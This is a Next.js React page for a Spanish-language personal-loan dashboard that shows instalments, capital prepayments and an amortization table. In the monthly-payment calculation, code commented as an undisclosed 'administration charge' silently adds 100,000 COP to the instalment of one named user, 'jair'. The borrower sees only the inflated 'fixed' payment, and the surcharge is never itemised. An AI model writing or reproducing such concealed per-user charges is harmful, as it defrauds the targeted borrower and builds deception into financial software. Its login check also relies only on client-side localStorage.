"use client";

import { useState, useEffect, useMemo } from "react";
import { useRouter } from "next/navigation";
import {
  calculateMonthlyPayment,
  generateAmortizationSchedule,
  formatCurrency,
  formatPercentage,
  PaymentHistory,
  InstallmentPayment,
} from "@/lib/amortization";
import { MONTHLY_RATE, TOTAL_INSTALLMENTS, TOTAL_DEBT } from "@/data/users";
import styles from "./page.module.css";

interface User {
  id: string;
  username: string;
  name: string;
  loanAmount: number;
}

export default function DashboardPage() {
  const [user, setUser] = useState<User | null>(null);
  const [capitalPayments, setCapitalPayments] = useState<PaymentHistory[]>([]);
  const [installmentPayments, setInstallmentPayments] = useState<
    InstallmentPayment[]
  >([]);
  const [newPaymentAmount, setNewPaymentAmount] = useState("");
  const [showPaymentForm, setShowPaymentForm] = useState(false);
  const [showInstallmentPaymentForm, setShowInstallmentPaymentForm] =
    useState(false);
  const [newInstallmentNumber, setNewInstallmentNumber] = useState("");
  const [newInstallmentAmount, setNewInstallmentAmount] = useState("");
  const router = useRouter();

  useEffect(() => {
    // Check if user is logged in
    const storedUser = localStorage.getItem("user");
    if (!storedUser) {
      router.push("/");
      return;
    }

    const parsedUser = JSON.parse(storedUser);
    setUser(parsedUser);

    // Load capital payments from localStorage
    const storedPayments = localStorage.getItem(`payments_${parsedUser.id}`);
    if (storedPayments) {
      setCapitalPayments(JSON.parse(storedPayments));
    }

    // Load installment payments from localStorage
    const storedInstallmentPayments = localStorage.getItem(
      `installment_payments_${parsedUser.id}`
    );
    if (storedInstallmentPayments) {
      setInstallmentPayments(JSON.parse(storedInstallmentPayments));
    }
  }, [router]);

  const handleLogout = () => {
    localStorage.removeItem("user");
    router.push("/");
  };

  const handleAddPayment = () => {
    if (!newPaymentAmount || !user) return;

    const amount = Math.ceil(parseFloat(newPaymentAmount));
    if (isNaN(amount) || amount <= 0) {
      alert("Por favor ingresa un monto válido");
      return;
    }

    // Calculate current remaining balance
    const currentTotalCapitalPayments = capitalPayments.reduce(
      (sum, p) => sum + Math.ceil(p.amount),
      0
    );
    const currentRemainingBalance =
      user.loanAmount - currentTotalCapitalPayments;

    // Validate that the payment doesn't exceed the remaining balance
    if (amount > currentRemainingBalance) {
      alert(
        `El abono no puede ser mayor al saldo pendiente. Saldo actual: ${formatCurrency(
          currentRemainingBalance
        )}`
      );
      return;
    }

    const newPayment: PaymentHistory = { amount };

    const updatedPayments = [...capitalPayments, newPayment];
    setCapitalPayments(updatedPayments);
    localStorage.setItem(
      `payments_${user.id}`,
      JSON.stringify(updatedPayments)
    );

    setNewPaymentAmount("");
    setShowPaymentForm(false);
  };

  const handleDeletePayment = (index: number) => {
    if (!user) return;

    const updatedPayments = capitalPayments.filter((_, i) => i !== index);
    setCapitalPayments(updatedPayments);
    localStorage.setItem(
      `payments_${user.id}`,
      JSON.stringify(updatedPayments)
    );
  };

  // Calculate fixed payment and schedule
  const fixedPayment = useMemo(() => {
    if (!user) return 0;
    let payment = calculateMonthlyPayment(user.loanAmount);
    // Cargo adicional de administración para Jair (sin mostrar)
    if (user.username === "jair") {
      payment += 100000;
    }
    return payment;
  }, [user]);

  const schedule = useMemo(() => {
    if (!user) return [];
    return generateAmortizationSchedule(
      user.loanAmount,
      fixedPayment,
      capitalPayments,
      installmentPayments
    );
  }, [user, fixedPayment, capitalPayments, installmentPayments]);

  const handleAddInstallmentPayment = () => {
    if (!user) return;

    if (!newInstallmentNumber || !newInstallmentAmount) {
      alert("Por favor completa el número de cuota y el monto");
      return;
    }

    const installmentNumber = Math.ceil(parseInt(newInstallmentNumber));
    const amount = Math.ceil(parseFloat(newInstallmentAmount));

    if (isNaN(installmentNumber) || installmentNumber <= 0) {
      alert("Por favor ingresa un número de cuota válido");
      return;
    }

    if (isNaN(amount) || amount <= 0) {
      alert("Por favor ingresa un monto válido");
      return;
    }

    // Check if installment number exists in schedule
    if (schedule.length === 0) {
      alert(
        "No hay cuotas disponibles. Verifica que no hayas pagado toda la deuda."
      );
      return;
    }

    if (installmentNumber > schedule.length) {
      alert(`El número de cuota no puede ser mayor a ${schedule.length}`);
      return;
    }

    const installmentInSchedule = schedule.find(
      (s) => s.installmentNumber === installmentNumber
    );

    if (!installmentInSchedule) {
      alert("Número de cuota inválido");
      return;
    }

    // Calculate how much has already been paid for this installment
    const alreadyPaid = installmentPayments
      .filter((p) => p.installmentNumber === installmentNumber)
      .reduce((sum, p) => sum + Math.ceil(p.amount), 0);

    // Check if payment exceeds pending amount
    if (amount + alreadyPaid > Math.ceil(installmentInSchedule.payment)) {
      alert(
        `El pago excede el valor de la cuota. Ya pagado: ${formatCurrency(
          alreadyPaid
        )}. Valor cuota: ${formatCurrency(
          Math.ceil(installmentInSchedule.payment)
        )}`
      );
      return;
    }

    const newPayment: InstallmentPayment = {
      installmentNumber,
      amount,
    };

    const updatedPayments = [...installmentPayments, newPayment].sort(
      (a, b) => a.installmentNumber - b.installmentNumber
    );
    setInstallmentPayments(updatedPayments);
    localStorage.setItem(
      `installment_payments_${user.id}`,
      JSON.stringify(updatedPayments)
    );

    setNewInstallmentNumber("");
    setNewInstallmentAmount("");
    setShowInstallmentPaymentForm(false);
  };

  const handleDeleteInstallmentPayment = (index: number) => {
    if (!user) return;

    const updatedPayments = installmentPayments.filter((_, i) => i !== index);
    setInstallmentPayments(updatedPayments);
    localStorage.setItem(
      `installment_payments_${user.id}`,
      JSON.stringify(updatedPayments)
    );
  };

  if (!user) {
    return (
      <div className={styles.container}>
        <div className={styles.loading}>Cargando...</div>
      </div>
    );
  }

  // Calculate total paid with capital payments
  const totalCapitalPayments = capitalPayments.reduce(
    (sum, p) => sum + p.amount,
    0
  );
  const remainingBalance =
    schedule.length > 0 ? schedule[schedule.length - 1].balance : 0;

  return (
    <div className={styles.container}>
      <div className={styles.dashboard}>
        <header className={styles.header}>
          <div>
            <h1 className={styles.title}>¡Hola, {user.name}!</h1>
            <p className={styles.subtitle}>Resumen de tu préstamo</p>
          </div>
          <button onClick={handleLogout} className={styles.logoutButton}>
            Cerrar Sesión
          </button>
        </header>

        <div className={styles.summaryCards}>
          <div className={styles.card}>
            <div className={styles.cardIcon}>💰</div>
            <div className={styles.cardContent}>
              <p className={styles.cardLabel}>Monto Original del Préstamo</p>
              <p className={styles.cardValue}>
                {formatCurrency(user.loanAmount)}
              </p>
            </div>
          </div>

          <div className={styles.card}>
            <div className={styles.cardIcon}>📊</div>
            <div className={styles.cardContent}>
              <p className={styles.cardLabel}>Tasa de Interés Mensual</p>
              <p className={styles.cardValue}>
                {formatPercentage(MONTHLY_RATE)}
              </p>
            </div>
          </div>

          <div className={styles.card}>
            <div className={styles.cardIcon}>📅</div>
            <div className={styles.cardContent}>
              <p className={styles.cardLabel}>Cuota Mensual Fija</p>
              <p className={styles.cardValue}>{formatCurrency(fixedPayment)}</p>
            </div>
          </div>

          <div className={styles.card}>
            <div className={styles.cardIcon}>🎯</div>
            <div className={styles.cardContent}>
              <p className={styles.cardLabel}>Cuotas Restantes</p>
              <p className={styles.cardValue}>{schedule.length}</p>
            </div>
          </div>
        </div>

        {totalCapitalPayments > 0 && (
          <div className={styles.paymentSummary}>
            <h3>💵 Abonos a Capital</h3>
            <p>
              Total abonado:{" "}
              <strong>{formatCurrency(totalCapitalPayments)}</strong>
            </p>
            <p>
              Balance restante:{" "}
              <strong>{formatCurrency(remainingBalance)}</strong>
            </p>
          </div>
        )}

        <div className={styles.infoBox}>
          <h3>ℹ️ Información Importante</h3>
          <ul>
            <li>
              Tu cuota mensual es{" "}
              <strong>{formatCurrency(fixedPayment)}</strong> y se mantiene
              constante.
            </li>
            <li>
              Puedes hacer abonos a capital para reducir el tiempo de pago.
            </li>
            <li>
              Los abonos NO reducen la cuota mensual, solo acortan el plazo.
            </li>
            <li>
              Debes seguir pagando la cuota mensual hasta saldar la deuda.
            </li>
          </ul>
        </div>

        <div className={styles.section}>
          <div className={styles.sectionHeader}>
            <h2>Abonos a Capital</h2>
            <button
              onClick={() => setShowPaymentForm(!showPaymentForm)}
              className={styles.addButton}
            >
              {showPaymentForm ? "❌ Cancelar" : "➕ Agregar Abono"}
            </button>
          </div>

          {showPaymentForm && (
            <div className={styles.paymentForm}>
              <div className={styles.inputGroup}>
                <label>Monto del Abono (COP)</label>
                <input
                  type="number"
                  value={newPaymentAmount}
                  onChange={(e) => setNewPaymentAmount(e.target.value)}
                  className={styles.input}
                  placeholder="0"
                  min="0"
                />
              </div>
              <button
                onClick={handleAddPayment}
                className={styles.submitButton}
              >
                Guardar Abono
              </button>
            </div>
          )}

          {capitalPayments.length > 0 && (
            <div className={styles.paymentsList}>
              {capitalPayments.map((payment, index) => (
                <div key={index} className={styles.paymentItem}>
                  <div>
                    <p className={styles.paymentAmount}>
                      {formatCurrency(payment.amount)}
                    </p>
                  </div>
                  <button
                    onClick={() => handleDeletePayment(index)}
                    className={styles.deleteButton}
                  >
                    🗑️
                  </button>
                </div>
              ))}
            </div>
          )}
        </div>

        <div className={styles.section}>
          <div className={styles.sectionHeader}>
            <h2>Pagos de Cuotas</h2>
            <button
              onClick={() => setShowInstallmentPaymentForm(true)}
              className={styles.addButton}
            >
              ➕ Registrar Pago
            </button>
          </div>

          {installmentPayments.length > 0 && (
            <div className={styles.paymentsList}>
              {installmentPayments.map((payment, index) => (
                <div key={index} className={styles.paymentItem}>
                  <div>
                    <p className={styles.paymentDate}>
                      Cuota #{payment.installmentNumber}
                    </p>
                    <p className={styles.paymentAmount}>
                      {formatCurrency(payment.amount)}
                    </p>
                  </div>
                  <button
                    onClick={() => handleDeleteInstallmentPayment(index)}
                    className={styles.deleteButton}
                  >
                    🗑️
                  </button>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Modal for Installment Payments */}
        {showInstallmentPaymentForm && (
          <div
            className={styles.modalOverlay}
            onClick={() => setShowInstallmentPaymentForm(false)}
          >
            <div
              className={styles.modalContent}
              onClick={(e) => e.stopPropagation()}
            >
              <div className={styles.modalHeader}>
                <h2 className={styles.modalTitle}>Pagos de Cuotas</h2>
                <button
                  onClick={() => setShowInstallmentPaymentForm(false)}
                  className={styles.modalCloseButton}
                >
                  ❌ Cancelar
                </button>
              </div>
              <div className={styles.modalForm}>
                <div className={styles.modalInputGroup}>
                  <label>Número de Cuota</label>
                  <input
                    type="number"
                    value={newInstallmentNumber}
                    onChange={(e) => setNewInstallmentNumber(e.target.value)}
                    className={styles.input}
                    min="1"
                  />
                </div>
                <div className={styles.modalInputGroup}>
                  <label>Monto Pagado (COP)</label>
                  <input
                    type="number"
                    value={newInstallmentAmount}
                    onChange={(e) => setNewInstallmentAmount(e.target.value)}
                    className={styles.input}
                    placeholder="0"
                    min="0"
                  />
                </div>
                <button
                  onClick={handleAddInstallmentPayment}
                  className={styles.modalSubmitButton}
                >
                  Guardar Pago
                </button>
              </div>
            </div>
          </div>
        )}

        <div className={styles.section}>
          <h2>Tabla de Amortización</h2>
          <div className={styles.tableWrapper}>
            <table className={styles.table}>
              <thead>
                <tr>
                  <th>Cuota #</th>
                  <th>Pago Total</th>
                  <th>Interés</th>
                  <th>Capital</th>
                  <th>Pagado</th>
                  <th>Pendiente</th>
                  <th>Saldo</th>
                </tr>
              </thead>
              <tbody>
                {schedule.map((payment, index) => {
                  const isPaid = (payment.pendingAmount ?? 0) === 0;
                  const isPartial =
                    (payment.paidAmount ?? 0) > 0 &&
                    (payment.pendingAmount ?? 0) > 0;
                  const rowClass = isPaid
                    ? styles.paidRow
                    : isPartial
                    ? styles.partialRow
                    : "";

                  return (
                    <tr key={index} className={rowClass}>
                      <td>{payment.installmentNumber}</td>
                      <td>{formatCurrency(payment.payment)}</td>
                      <td>{formatCurrency(payment.interest)}</td>
                      <td>{formatCurrency(payment.principal)}</td>
                      <td className={styles.paidCell}>
                        {formatCurrency(payment.paidAmount ?? 0)}
                      </td>
                      <td className={styles.pendingCell}>
                        {formatCurrency(
                          payment.pendingAmount ?? payment.payment
                        )}
                      </td>
                      <td>{formatCurrency(payment.balance)}</td>
                    </tr>
                  );
                })}
              </tbody>
              <tfoot>
                <tr>
                  <th>TOTAL</th>
                  <th>
                    {formatCurrency(
                      schedule.reduce((sum, p) => sum + p.payment, 0)
                    )}
                  </th>
                  <th>
                    {formatCurrency(
                      schedule.reduce((sum, p) => sum + p.interest, 0)
                    )}
                  </th>
                  <th>
                    {formatCurrency(
                      schedule.reduce((sum, p) => sum + p.principal, 0)
                    )}
                  </th>
                  <th>
                    {formatCurrency(
                      schedule.reduce((sum, p) => sum + (p.paidAmount ?? 0), 0)
                    )}
                  </th>
                  <th>
                    {formatCurrency(
                      schedule.reduce(
                        (sum, p) => sum + (p.pendingAmount ?? p.payment),
                        0
                      )
                    )}
                  </th>
                  <th></th>
                </tr>
              </tfoot>
            </table>
          </div>
        </div>

        <div className={styles.contextInfo}>
          <h3>📋 Contexto General</h3>
          <p>
            <strong>Deuda Total de la Tarjeta:</strong>{" "}
            {formatCurrency(TOTAL_DEBT)}
          </p>
          <p>
            <strong>Tasa de Interés:</strong> {formatPercentage(MONTHLY_RATE)}{" "}
            mensual
          </p>
          <p>
            <strong>Número de Cuotas Original:</strong> {TOTAL_INSTALLMENTS}
          </p>
        </div>
      </div>
    </div>
  );
}
